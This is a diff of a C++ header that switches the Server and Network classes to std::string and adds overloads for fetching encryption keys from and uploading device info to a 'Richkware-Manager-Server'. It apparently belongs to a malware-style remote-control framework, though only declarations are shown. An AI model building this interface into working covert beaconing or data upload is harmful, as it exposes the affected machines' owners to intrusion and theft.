@@ -32,7 +32,7 @@ struct ClientSocketThreadArgs {
 class Server {
 private:
     std::string encryptionKey;
-    const char *port;
+    std::string port;
     HANDLE hThread;
     SOCKET listenSocket;
     ServerThreadArgs sta;
@@ -43,36 +43,52 @@ public:
 
     Server &operator=(const Server &server);
 
-    void Start(const char *port, bool encrypted = false);
+    void Start(std::string port, bool encrypted = false);
 
     void Stop();
 
     HANDLE getHhread();
 
-    const char *getPort();
+    std::string getPort();
 
 };
 
 class Network {
 private:
     std::string encryptionKey;
+    std::string serverAddress;
+    std::string port;
+    std::string associatedUser;
 public:
     Server server;
 
     Network() {}
 
-    Network(std::string encryptionKeyArg);
+    //Network(const std::string &encryptionKeyArg);
+
+    Network(const std::string &serverAddress, std::string port,
+            const std::string &associatedUser,
+            const std::string &encryptionKey);
 
     Network &operator=(const Network &network);
 
-    std::string RawRequest(const char *serverAddress, const char *port, const char *request);
+    static std::string
+    RawRequest(const std::string &serverAddress, const std::string &port, const std::string &request);
 
-    const char *ResolveAddress(const char *address);
+    static std::string ResolveAddress(const std::string &address);
 
-    std::string GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *associatedUser);
+    std::string GetEncryptionKeyFromRMS();
+
+    static std::string GetEncryptionKeyFromRMS(const std::string &serverAddress, const std::string &port,
+                                               const std::string &associatedUser,
+                                               const std::string &encryptionKey);
 
     // upload info to Richkware-Manager-Server
-    bool UploadInfoToRMS(const char *serverAddress, const char *port, const char *associatedUser);
+    bool UploadInfoToRMS();
+
+    static bool
+    UploadInfoToRMS(const std::string &serverAddress, const std::string &port, const std::string &associatedUser,
+                    const std::string &serverPort, const std::string &encryptionKey);
 };
 
 class Device {
